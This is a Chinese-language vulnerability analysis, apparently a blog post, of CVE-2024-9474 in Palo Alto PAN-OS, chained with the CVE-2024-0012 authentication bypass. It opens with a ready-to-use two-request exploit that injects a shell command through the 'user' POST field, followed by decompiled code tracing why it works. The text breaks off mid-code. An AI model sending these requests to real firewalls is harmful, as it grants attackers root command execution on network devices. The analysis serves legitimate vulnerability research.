        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号：CVE-2024-9474 </p><p>漏洞名称：Palo Alto 权限提升漏洞</p><p>漏洞利用：和 CVE-2024-0012 认证绕过漏洞配合实现权限提升到 ROOT RCE。</p><p>环境搭建参考 CVE-2024-0012 文章中。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞利用分为 2 个步骤：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/php/utils/createRemoteAppwebSession.php/watchTowr.js.map</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>&#123;&#123;Hostname&#125;&#125;<br><span class="hljs-attribute">X-PAN-AUTHCHECK</span><span class="hljs-punctuation">: </span>off<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>107<br><br><span class="language-dts"><span class="hljs-attr">user</span><span class="hljs-operator">=</span>`echo $(uname -a) &gt; <span class="hljs-keyword">/var/</span>appweb<span class="hljs-keyword">/htdocs/</span>unauth/watchTowr.php`<span class="hljs-variable">&amp;</span>userR<span class="hljs-attr">ole</span><span class="hljs-operator">=</span>superuser<span class="hljs-variable">&amp;</span>remoteH<span class="hljs-attr">ost</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;vsys</span>=vsys1</span><br><span class="language-dts"></span><br><span class="language-dts"></span><br><span class="language-dts">GET /index.php/.js.map HTTP/<span class="hljs-number">1.1</span></span><br><span class="language-dts"><span class="hljs-symbol">Host:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span>Hostname<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br><span class="language-dts"><span class="hljs-symbol">Cookie:</span> PHPSESSID=<span class="hljs-number">2</span>qe3kouhjdm8317f6vmueh1m8n<span class="hljs-punctuation">;</span></span><br><span class="language-dts">X-PAN-AUTHCHECK: off</span><br><span class="language-dts"><span class="hljs-symbol">Connection:</span> keep-alive</span><br></code></pre></td></tr></table></figure><p>php&#x2F;utils&#x2F;createRemoteAppwebSession.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title class_">WebSession</span>::<span class="hljs-title function_ invoke__">start</span>();<br><br><span class="hljs-comment">/** <span class="hljs-doctag">@noinspection</span> PhpUndefinedFunctionInspection */</span><br><span class="hljs-variable">$isCms</span> = <span class="hljs-title function_ invoke__">panui_platform_is_cms</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$isCms</span> == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// create a remote appweb session only on a device</span><br>    <span class="hljs-comment">// &#x27;vsys&#x27; is the list of accessible vsys for the user. If blank then it means all vsys</span><br><br>    <span class="hljs-variable">$locale</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;locale&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;locale&#x27;</span>] : <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;locale&#x27;</span>];<br>    <span class="hljs-comment">/** <span class="hljs-doctag">@noinspection</span> PhpUndefinedFunctionInspection */</span><br>    <span class="hljs-title function_ invoke__">panCreateRemoteAppwebSession</span>(<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;userRole&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;remoteHost&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;vsys&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;editShared&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;prot&#x27;</span>],<br>        <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;rbaxml&#x27;</span>],<br>        <span class="hljs-variable">$locale</span>,<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;hideHeaderBg&#x27;</span>]<br>    );<br>&#125;<br><br><span class="hljs-title function_ invoke__">session_write_close</span>();<br></code></pre></td></tr></table></figure><p>主要处理逻辑是 panCreateRemoteAppwebSession，上面注释表示这是 PHP 未定义函数，那么就应该是扩展什么的。</p><p>之前分析过 PHP 配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">include_path</span> = <span class="hljs-string">&quot;.:/var/appweb/htdocs/phpincludes:/usr/lib64/php/modules&quot;</span> <span class="hljs-comment">; PAN-MODIFIED</span><br><span class="hljs-attr">extension_dir</span> = <span class="hljs-string">&quot;/usr/lib64/php/modules&quot;</span> <span class="hljs-comment">; PAN-MODIFIED - likely not needed. it is already working</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tar -czvf php_modules.tar.gz <span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/php/m</span>odules/<br></code></pre></td></tr></table></figure><p>&#x2F;usr&#x2F;lib64&#x2F;php&#x2F;modules 目录中：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607140326695.png?imageSlim" alt="image-20250607140326695"></p><p>PHP 包装：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607140422445.png?imageSlim" alt="image-20250607140422445"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607140447259.png?imageSlim" alt="image-20250607140447259"></p><p>panhttpdmodule.so</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607140501034.png?imageSlim" alt="image-20250607140501034"></p><p>让 AI 帮忙转换为伪代码方便观看逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">panCreateRemoteAppwebSession</span><span class="hljs-params">(</span><br><span class="hljs-params">    user: str,</span><br><span class="hljs-params">    userRole: str,</span><br><span class="hljs-params">    remoteHost: str,</span><br><span class="hljs-params">    accessibleVsys: str,</span><br><span class="hljs-params">    editShared: <span class="hljs-type">bool</span>,</span><br><span class="hljs-params">    protocol: str,</span><br><span class="hljs-params">    serverPort: <span class="hljs-type">int</span>,</span><br><span class="hljs-params">    rbaXml: str,</span><br><span class="hljs-params">    locale: str,</span><br><span class="hljs-params">    hideHeaderBg: <span class="hljs-type">bool</span></span><br><span class="hljs-params">)</span> -&gt; <span class="hljs-type">int</span>:<br>    # 初始化变量和缓冲区<br>    sessionData = allocateMemory(<span class="hljs-number">0x300</span>)<br>    errorBuffer = allocateMemory(<span class="hljs-number">0x2D8</span>)<br>    deviceInfo = &#123;&#125;<br>    vsysNames = []<br>    <br>    # <span class="hljs-number">1.</span> 参数验证<br>    <span class="hljs-keyword">if</span> not user or not userRole or not remoteHost or not accessibleVsys:<br>        printError(<span class="hljs-string">&quot;Required parameters not specified&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>  # 错误代码<br>    <br>    # <span class="hljs-number">2.</span> 远程主机安全检查<br>    clientHost = getServerVar(<span class="hljs-string">&quot;REMOTE_HOST&quot;</span>)<br>    <span class="hljs-keyword">if</span> clientHost and clientHost not in [<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;::1&quot;</span>, <span class="hljs-string">&quot;0:0:0:0:0:0:0:1&quot;</span>]:<br>        <span class="hljs-keyword">if</span> not clientHost.startswith(<span class="hljs-string">&quot;trusted_prefix&quot;</span>):<br>            printError(<span class="hljs-string">&quot;Unauthorized&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <br>    # <span class="hljs-number">3.</span> IP地址处理<br>    <span class="hljs-keyword">if</span> remoteHost.startswith(<span class="hljs-string">&quot;http://&quot;</span>):<br>        ipPart = remoteHost[<span class="hljs-number">7</span>:]  # 去掉<span class="hljs-string">&quot;http://&quot;</span>前缀<br>        <br>        <span class="hljs-keyword">if</span> isIPv6(ipPart):<br>            <span class="hljs-keyword">if</span> not validateIPv6(ipPart):<br>                logDebug(<span class="hljs-string">&quot;Invalid IPv6 address&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> not validateIPv4(ipPart):<br>                logDebug(<span class="hljs-string">&quot;Invalid IPv4 address&quot;</span>)<br>    <br>    # <span class="hljs-number">4.</span> 用户认证<br>    protocolType = getProtocolType(protocol, serverPort)<br>    authResult = authenticateUser(<br>        user=user,<br>        password=<span class="hljs-string">&quot;&quot;</span>,  # 密码可能在其他地方处理<br>        protocol=protocolType,<br>        host=remoteHost,<br>        vsys=accessibleVsys,<br>        sessionData=sessionData<br>    )<br>    <br>    <span class="hljs-keyword">if</span> authResult != <span class="hljs-number">0</span>:<br>        printError(<span class="hljs-string">&quot;Authentication failed&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  # 注意这里返回<span class="hljs-number">0</span>表示错误<br>    <br>    # <span class="hljs-number">5.</span> 创建PHP会话<br>    sessionStart()<br>    sessionSet(<span class="hljs-string">&quot;cmsRemoteSession&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    sessionSet(<span class="hljs-string">&quot;panorama_sessionid&quot;</span>, <span class="hljs-string">&quot;dummy&quot;</span>)  # 硬编码值<br>    sessionSet(<span class="hljs-string">&quot;user&quot;</span>, user)<br>    sessionSet(<span class="hljs-string">&quot;userRole&quot;</span>, userRole)<br>    sessionSet(<span class="hljs-string">&quot;vsys&quot;</span>, accessibleVsys)<br>    sessionSet(<span class="hljs-string">&quot;editShared&quot;</span>, editShared)<br>    <br>    # <span class="hljs-number">6.</span> 获取设备信息<br>    <span class="hljs-keyword">if</span> getDeviceInfo(user, deviceInfo, errorBuffer) == <span class="hljs-number">0</span>:<br>        sessionSet(<span class="hljs-string">&quot;model&quot;</span>, deviceInfo.model)<br>        sessionSet(<span class="hljs-string">&quot;serialNo&quot;</span>, deviceInfo.serial)<br>        sessionSet(<span class="hljs-string">&quot;version&quot;</span>, deviceInfo.version)<br>        sessionSet(<span class="hljs-string">&quot;isCms&quot;</span>, <span class="hljs-string">&quot;no&quot;</span>)<br>        <br>        <span class="hljs-keyword">if</span> locale:<br>            sessionSet(<span class="hljs-string">&quot;locale&quot;</span>, locale)<br>        <span class="hljs-keyword">if</span> hideHeaderBg:<br>            sessionSet(<span class="hljs-string">&quot;hideHeaderBg&quot;</span>, hideHeaderBg)<br>    <br>    # <span class="hljs-number">7.</span> 处理RBAC XML<br>    <span class="hljs-keyword">if</span> rbaXml:<br>        # 清理XML中的换行符<br>        cleanedXml = rbaXml.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)<br>        sessionSet(<span class="hljs-string">&quot;RBA_XML&quot;</span>, cleanedXml)<br>        <br>        <span class="hljs-keyword">if</span> applyRBACFromXml(user, cleanedXml, errorBuffer) != <span class="hljs-number">0</span>:<br>            printError(errorBuffer)<br>            cleanup()<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <br>    # <span class="hljs-number">8.</span> 处理VSYS配置<br>    defaultVsys = <span class="hljs-string">&quot;vsys1&quot;</span><br>    <span class="hljs-keyword">if</span> accessibleVsys:<br>        vsysList = accessibleVsys.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-keyword">if</span> vsysList:<br>            defaultVsys = vsysList[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">else</span>:<br>        # 获取所有可用VSYS<br>        vsysNames = getAllVsysNames(user, <span class="hljs-string">&quot;localhost.localdomain&quot;</span>)<br>        <span class="hljs-keyword">if</span> vsysNames:<br>            defaultVsys = vsysNames[<span class="hljs-number">0</span>]<br>    <br>    # 设置设备和VSYS关联<br>    <span class="hljs-keyword">if</span> setDeviceAndVsysForSession(user, <span class="hljs-string">&quot;localhost.localdomain&quot;</span>, defaultVsys, errorBuffer) != <span class="hljs-number">0</span>:<br>        printError(errorBuffer)<br>        cleanup()<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <br>    # <span class="hljs-number">9.</span> 清理并返回<br>    sessionWriteClose()<br>    freeAuthResources(sessionData)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  # 成功<br></code></pre></td></tr></table></figure><p>主要是经过一系列的验证，然后把 user ( payload ) 存储到 session 的 user 位置。</p><ul><li>远程主机安全检查</li><li>用户认证</li></ul><p>先看看为什么 远程主机安全检查 可以通过，跟进一些获取 REMOTE_HOST 的方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c">v12 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)pan_php_SERVER_get_str((__int64)<span class="hljs-string">&quot;REMOTE_HOST&quot;</span>, <span class="hljs-number">0LL</span>, (__int64)&amp;v48);<br><br>__int64 __fastcall <span class="hljs-title function_">pan_php_SERVER_get_str</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> pan_php_SERVER_get_str(a1, a2);<br>&#125;<br><br>__int64 __fastcall <span class="hljs-title function_">pan_php_SERVER_get_str</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// eax</span><br>  __int64 v5; <span class="hljs-comment">// rdx</span><br>  <br>  v2 = pan_php_get_superglobal((__int64)<span class="hljs-string">&quot;_SERVER&quot;</span>);<br>  v3 = pan_zval_assoc_get_prop(v2, a1);<br>  v4 = pan_zval_to_maybe(v3);<br>  <span class="hljs-keyword">return</span> pan_maybe_str_unwrap_or(v4, v5, a2);<br>&#125;<br><br>__int64 __fastcall <span class="hljs-title function_">pan_php_get_superglobal</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> pan_php_get_superglobal((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)a1);<br>&#125;<br><br>__int64 __fastcall <span class="hljs-title function_">pan_php_get_superglobal</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// r12</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  __int64 v4; <span class="hljs-comment">// rax</span><br><br>  v1 = zend_hash_str_find((__int64)&amp;executor_globals + <span class="hljs-number">304</span>, (__int64)a1, <span class="hljs-built_in">strlen</span>(a1));<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)pan_zval_is_array(v1) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( panui_log_target == <span class="hljs-number">1</span> )<br>    &#123;<br>      zend_error(<span class="hljs-number">900LL</span>, <span class="hljs-string">&quot;%s: get $%s: found&quot;</span>, <span class="hljs-string">&quot;pan_php_superglobal.c&quot;</span>, a1);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( panui_log_level &gt; <span class="hljs-number">899</span> )<br>    &#123;<br>      LODWORD(v3) = getpid();<br>      __pan_print(&amp;unk_349C8, <span class="hljs-number">8LL</span>, <span class="hljs-string">&quot;pan_php_get_superglobal&quot;</span>, <span class="hljs-number">4LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;trace [%d] %s(%d): get $%s: found\n&quot;</span>, v3);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( panui_log_target == <span class="hljs-number">1</span> )<br>  &#123;<br>    zend_error(<span class="hljs-number">900LL</span>, <span class="hljs-string">&quot;%s: get $%s: not found&quot;</span>, <span class="hljs-string">&quot;pan_php_superglobal.c&quot;</span>, a1);<br>    v1 = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v1 = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-keyword">if</span> ( panui_log_level &gt; <span class="hljs-number">899</span> )<br>    &#123;<br>      LODWORD(v4) = getpid();<br>      __pan_print(&amp;unk_349C8, <span class="hljs-number">11LL</span>, <span class="hljs-string">&quot;pan_php_get_superglobal&quot;</span>, <span class="hljs-number">4LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;trace [%d] %s(%d): get $%s: not found\n&quot;</span>, v4);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v1;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>是通过 zend_hash_str_find （ PHP 提供的 ）获取 _SERVER 也就是获取 PHP 的 <code>$_SERVER[&#39;REMOTE_HOST&#39;]</code> </p><p>回顾在 CVE-2024-0012 分析 PA 的架构：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">request =&gt; nginx(<span class="hljs-number">443</span>) =&gt; apache(<span class="hljs-number">28250</span>) =&gt; php(php.ini,index.php) =&gt; envSetup.php =&gt; target.php<br></code></pre></td></tr></table></figure><p>PA 是通过 nginx 反向代理把流量给 apache 的，那么就是：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">nginx</span><span class="hljs-params">(<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>)</span></span> =&gt; <span class="hljs-built_in">apache</span>(<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">28250</span>)<br></code></pre></td></tr></table></figure><p>那么 nginx + apache + php 是怎么识别客户端 IP 的呢？</p><p>答案就是 nginx 配置 proxy_set_header：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607143903378.png?imageSlim" alt="image-20250607143903378"></p><p>这个组合漏洞的巧妙之处就在于 PA nginx 配置这些头部是通过包含的方式：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">include</span> <span class="hljs-keyword">conf</span>/proxy_default.<span class="hljs-keyword">conf</span>;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607144108442.png?imageSlim" alt="image-20250607144108442"></p><p>但是 CVE-2024-0012 的 js.map 是没有包含的，所以在 apache 看来就是本地的 nginx 请求本地的 apache。所以第一个限制就过去了。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250607144136338.png?imageSlim" alt="image-20250607144136338"></p><p>然后来看第二个限制 用户认证：</p><p>AI 生成的伪代码如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// 函数目的：执行用户认证请求，处理认证流程并与认证服务通信</span><br><span class="hljs-comment">// 返回值：0表示成功，非0表示失败</span><br><br>__int64 panSwalAuthenticate(<br>    __int64 alloc_ptr,        <span class="hljs-comment">// 内存分配器指针</span><br>    int is_cms_auth,          <span class="hljs-comment">// 是否为CMS认证(1=是,0=否)</span><br>    char <span class="hljs-operator">*</span>username,           <span class="hljs-comment">// 用户名</span><br>    _BYTE <span class="hljs-operator">*</span>password,          <span class="hljs-comment">// 密码(可能为空)</span><br>    __int64 <span class="hljs-keyword">protocol</span>,         <span class="hljs-comment">// 协议类型</span><br>    __int64 ip_address,       <span class="hljs-comment">// IP地址</span><br>    __int64 